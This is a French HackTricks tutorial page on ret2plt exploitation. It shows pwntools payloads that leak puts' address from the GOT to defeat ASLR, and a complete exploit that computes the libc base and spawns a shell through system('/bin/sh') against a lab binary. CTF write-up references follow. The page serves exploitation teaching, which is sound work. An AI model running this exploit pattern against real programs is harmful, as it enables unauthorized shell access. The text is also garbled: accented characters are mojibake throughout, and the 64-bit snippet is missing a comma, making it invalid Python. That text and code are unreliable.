# Ret2plt

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS : <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) **et** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **d√©p√¥ts GitHub.**

</details>
{% endhint %}

## Informations de base

L'objectif de cette technique serait de **fuite une adresse d'une fonction du PLT** pour pouvoir contourner l'ASLR. Cela est possible car, par exemple, si vous fuitez l'adresse de la fonction `puts` de la libc, vous pouvez ensuite **calculer o√π se trouve la base de `libc`** et calculer des d√©calages pour acc√©der √† d'autres fonctions telles que **`system`**.

Cela peut √™tre fait avec une charge utile `pwntools` comme ([**ici**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Notez comment **`puts`** (en utilisant l'adresse du PLT) est appel√© avec l'adresse de `puts` situ√©e dans la GOT (Global Offset Table). Cela est d√ª au fait qu'au moment o√π `puts` imprime l'entr√©e GOT de puts, cette **entr√©e contiendra l'adresse exacte de `puts` en m√©moire**.

Notez √©galement comment l'adresse de `main` est utilis√©e dans l'exploit afin que lorsque `puts` termine son ex√©cution, le **binaire rappelle `main` au lieu de se terminer** (ainsi l'adresse divulgu√©e restera valide).

{% hint style="danger" %}
Notez que pour que cela fonctionne, le **binaire ne doit pas √™tre compil√© avec PIE** ou vous devez avoir **trouv√© une fuite pour contourner PIE** afin de conna√Ætre l'adresse du PLT, de la GOT et de main. Sinon, vous devez d'abord contourner PIE.
{% endhint %}

Vous pouvez trouver un [**exemple complet de ce contournement ici**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). C'√©tait l'exploit final de cet **exemple**:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## Autres exemples & R√©f√©rences

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bits, ASLR activ√© mais pas de PIE, la premi√®re √©tape consiste √† remplir un d√©passement de tampon jusqu'au byte 0x00 du canary pour ensuite appeler puts et le divulguer. Avec le canary, un gadget ROP est cr√©√© pour appeler puts afin de divulguer l'adresse de puts depuis la GOT, puis un gadget ROP pour appeler `system('/bin/sh')`.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bits, ASLR activ√©, pas de canary, d√©passement de pile dans main √† partir d'une fonction enfant. Gadget ROP pour appeler puts afin de divulguer l'adresse de puts depuis la GOT, puis appeler un gadget one.
